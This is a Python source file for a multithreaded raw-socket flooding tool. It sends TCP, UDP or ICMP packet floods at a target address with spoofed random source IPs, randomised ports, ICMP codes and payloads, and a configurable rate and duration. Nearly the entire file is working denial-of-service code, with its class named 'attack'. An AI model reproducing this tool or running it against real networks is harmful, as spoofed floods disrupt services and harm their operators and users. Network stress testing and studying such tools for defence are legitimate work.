#coding:utf-8
#!/usr/bin/python
import threading
import argparse
import random
import struct 
import socket
import fcntl
import time
import uuid
import sys
import os
from protocol import ethernet, ip, tcp, udp, icmp

def get_mac_address(): 
    mac=uuid.UUID(int = uuid.getnode()).hex[-12:] 
    return ":".join([mac[e:e+2] for e in range(0,11,2)])

def get_random_ip(IP_POOL, choice):
    str_ip_addr = IP_POOL
    str_ip_mask = choice
    ip_addr = struct.unpack('>I',socket.inet_aton(str_ip_addr))[0]
    mask = 0x0
    for i in range(31, 31 - int(str_ip_mask), -1):
        mask = mask | ( 1 << i)
    ip_addr_min = ip_addr & (mask & 0xffffffff)
    ip_addr_max = ip_addr | (~mask & 0xffffffff)
    return socket.inet_ntoa(struct.pack('>I', random.randint(ip_addr_min, ip_addr_max)))

class attack(threading.Thread):
    def __init__ (self, sp, fm, dev, gwa, adm, ip, port, psize, con, fl, icty, icco, time, fi):
        threading.Thread.__init__(self)
        self.speed = sp
        self.floodingmode = fm
        self.device = dev
        self.gwaddr = gwa
        self.addresmode = adm
        self.ip = ip
        self.port = port
        self.size = psize
        self.content = con
        self.flags = fl
        self.icmptype = icty
        self.icmpcode = icco
        self.time = time
        self.payfi = fi

    def run(self):
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0800)
        localIP = socket.inet_ntoa(fcntl.ioctl(sock.fileno(), 0x8915, struct.pack('256s', self.device[:15]))[20:24])#win下socket.gethostbyname(socket.getfqdn(socket.gethostname(  )))
        if self.addresmode == "TRUE":
            sourceIP = localIP
        if self.content == 70000:
            byteport = random._urandom(1460)
        else:
             file = open(self.payfi, 'r+')
             file.seek(0)
        sizedecide = self.size
        if sizedecide == 70000:
            self.size = random.randint(0, 1460)
        if self.floodingmode == 'ICMP':
            icmptypeport = self.icmptype
            icmpcodeport = self.icmpcode
            if icmptypeport == 70000:
                self.icmptype = random.randint(0, 255)
            if icmpcodeport == 70000:
                self.icmpcode = random.randint(0, 255)
        else:
            portdecide = self.port
            if portdecide == 70000:
                self.port = random.randint(0, 65535)
        start1 = time.clock()
        while True:
            if time.clock() - start1 >= self.time:
                break
            start = time.clock()
            while True:
                end = time.clock()
                if end-start > 1/self.speed:
                    if self.addresmode == "RANDOM":
                        sourceIP = get_random_ip(localIP, '0')
                    if self.addresmode == "LOCALRANDOM":
                        sourceIP = get_random_ip(localIP, '24')
                    if sizedecide == 70001:
                        self.size = random.randint(0,1460)
                    if self.content == 70000:
                        bytes = byteport[0:self.size]
                    else:
                        try:
                            bytes = file.read(self.size)
                        except EOFError:
                            file.seek(0)
                            bytes = file.read(self.size)
                    if self.floodingmode == 'ICMP':
                        if icmptypeport == 70001:
                            self.icmptype = random.randint(0,255)
                        if icmpcodeport == 70001:
                            self.icmpcode = random.randint(0,255)
                        ipobj = ip.IP(sourceIP, self.ip, socket.IPPROTO_ICMP)
                        protocolobj = icmp.ICMP(bytes)
                        protocolh = protocolobj.pack()
                    else:
                        if portdecide == 70001:
                            self.port = random.randint(0, 65535)
                        if self.floodingmode == 'TCP':
                            ipobj = ip.IP(sourceIP, self.ip, socket.IPPROTO_TCP)
                            protocolobj = tcp.TCP(1234, self.port)
                            flagsport = self.flags.split(',', 5)
                            protocolobj.syn = int(flagsport[0])
                            protocolobj.ack = int(flagsport[1])
                            protocolobj.rst = int(flagsport[2])
                            protocolobj.fin = int(flagsport[3])
                            protocolobj.psh = int(flagsport[4])
                            protocolobj.urg = int(flagsport[5])
                            protocolobj.payload = bytes
                            protocolh = protocolobj.pack(ipobj.src, ipobj.dst)
                        else:
                            ipobj = ip.IP(sourceIP, self.ip, socket.IPPROTO_UDP)
                            protocolobj = udp.UDP(1234, self.port, bytes)
                            protocolh = protocolobj.pack(ipobj.src, ipobj.dst)
                    ipobj.length += len(protocolh) + len(bytes)
                    iph = ipobj.pack()
                    ethobj = ethernet.ETHER(get_mac_address(), self.gwaddr, 0x0800)
                    ethh = ethobj.pack()
                    packet = ethh + iph + protocolh + bytes
                    sock.sendto(packet, (self.device, 0))
                    break
        if self.content == 70001:
            file.close()
        sock.close()

parser = argparse.ArgumentParser()
parser.add_argument("-t", "--threads", default = 1, dest = 'fa_threads', type = int)
parser.add_argument("-s", "--speed", help = "no value means as fast as possible; other value means pps for each thread", default = 1000, dest = 'fa_speed', type = int)
parser.add_argument("-m", "--floodingmode", default = "TCP", dest = 'fa_fmode', choices = ['TCP','UDP','ICMP'])
parser.add_argument("-d", "--device", default = "eth0", dest = 'fa_dev')
parser.add_argument("-g", "--gatewayaddress", default = "00:00:00:00:00:00", dest = 'fa_gwaddr')
parser.add_argument("-a", "--addressmode", default = "RANDOM", dest = 'fa_addrm', choices = ['RANDOM','LOCALRANDOM','TRUE'])
parser.add_argument("-e", "--destination", default = "10.0.0.1", dest = 'fa_dstaddr')
parser.add_argument("-p", "--portlist", help = "from 0 to 65535, 70000 means each thread random select one; 70001 means each packet random select one", default = '70000', dest = 'fa_port')
parser.add_argument("-l", "--payloadlength", help = "from 0 to 1460, 70000 means each thread random select one; 70001 means each packet random select one", default = 70000, dest = 'fa_paylen', type = int)
parser.add_argument("-c", "--payloadcontent", help = "70000 means each thread random create constant payload;  70001 means each thread read content from cache file", default = 70000, dest = 'fa_paycon', type = int, choices = [70000, 70001])
parser.add_argument("-f", "--flags", help = "FLAGS is the combination of SYN, ACK, PUSH, RST... ", default = "0,0,0,0,0,0", dest = 'fa_flags')
parser.add_argument("-i", "--icmptype", help = "70000 means each thread random select one; 70001 means each packet random select one", default = 70000, dest = 'fa_icty', type = int)
parser.add_argument("-o", "--icmpcode", help = "70000 means each thread random select one; 70001 means each packet random select one", default = 70000, dest = 'fa_icco', type = int)
parser.add_argument("-j", "--floodingtime", help = "time for flooding", default = 10, dest = 'fa_time', type = int)
parser.add_argument("-r", "--payloadfile", help = "attack payloadfile", default = '1', dest = 'fa_payfi')
args = parser.parse_args()

portport = args.fa_port.split(',')

args.fa_threads = ( args.fa_threads > 0  and args.fa_threads or 1 )
args.fa_speed = ( args.fa_speed >= 0 and args.fa_speed or 1000 )
args.fa_paylen = ( ( ( args.fa_paylen > 0 and args.fa_paylen < 1460 ) or args.fa_paylen == 70000 or args.fa_paylen == 70001 ) and args.fa_paylen or 70000 )
args.fa_icty = ( ( ( args.fa_icty >= 0 and args.fa_icty <= 255 ) or args.fa_icty == 70000 or args.fa_icty == 70001 ) and args.fa_icty or 70000 )
args.fa_icco = ( ( ( args.fa_icco >= 0 and args.fa_icco <= 255 ) or args.fa_icco == 70000 or args.fa_icco == 70001 ) and args.fa_icco or 70000 )
args.fa_time = ( args.fa_time > 0  and args.fa_time or 10 )

if( args.fa_speed == 0 ):
    args.fa_speed = -1

for host in range(int(args.fa_threads)):
    args.fa_port = int(random.choice(portport))
    args.fa_port = ( ( ( args.fa_port > 0 and args.fa_port < 65535 ) or args.fa_port == 70000 or args.fa_port == 70001 ) and args.fa_port or 70000 )
    at = attack(args.fa_speed, args.fa_fmode, args.fa_dev, args.fa_gwaddr, args.fa_addrm, args.fa_dstaddr, args.fa_port, args.fa_paylen, args.fa_paycon, args.fa_flags, args.fa_icty, args.fa_icco, args.fa_time, args.fa_payfi)
    at.start()
